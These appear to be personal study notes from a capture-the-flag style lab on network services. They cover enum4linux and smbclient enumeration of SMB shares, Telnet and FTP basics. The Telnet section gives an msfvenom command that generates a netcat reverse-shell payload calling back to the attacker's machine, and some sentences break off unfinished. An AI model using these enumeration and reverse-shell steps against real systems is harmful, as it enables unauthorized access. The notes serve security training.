# Enum4Linux
```
Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official github.

The syntax of Enum4Linux is nice and simple: "enum4linux [options] ip"

TAG            FUNCTION

-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-A             all of the above (full basic enumeration)

usage

./enum4linux.pl -a <ip>
```

```
Find workgroup
Find name
os v

# Types of SMB Exploit
```
While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

Method Breakdown

So, from our enumeration stage, we know:

    - The SMB share location

    - The name of an interesting SMB share

SMBClient

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.

We can remotely access the SMB share using the syntax:

"smbclient //[IP]/[SHARE]"

Followed by the tags:

-U [name] : to specify the user

-p [port] : to specify the port

usage

smbclient  //10.10.10.2/secret -U suit -p 445
                            shares         user
smbclient  //10.10.228.31/profiles  -U anonymous

get <file>

# What is Telnet?
```
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Replacement

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.
 
How does Telnet work?

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"
```

# Types of Telnet Exploit

```
Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

    https://www.cvedetails.com/
    https://cve.mitre.org/

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it. 
```

`sudo tcpdump ip proto \\icmp -i tun0`
```
Start a tcpdump listener on your local machine using: "sudo tcpdump ip proto \\icmp -i tun0" This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
```
```
Now, use the command "ping [local tun0 ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with 
```
```
We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

.RUN generate 

```

# What is FTP?
```
File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

How does FTP work?
A typical FTP session operates using two channels:

    a command (sometimes called the control) channel
    a data channel. 

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

Active vs Passive

The FTP server may support either Active or Passive connections, or both. 

    * In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
    * In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.  

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections. 
```

```
Usage
ftp <ip>
get <file>
```
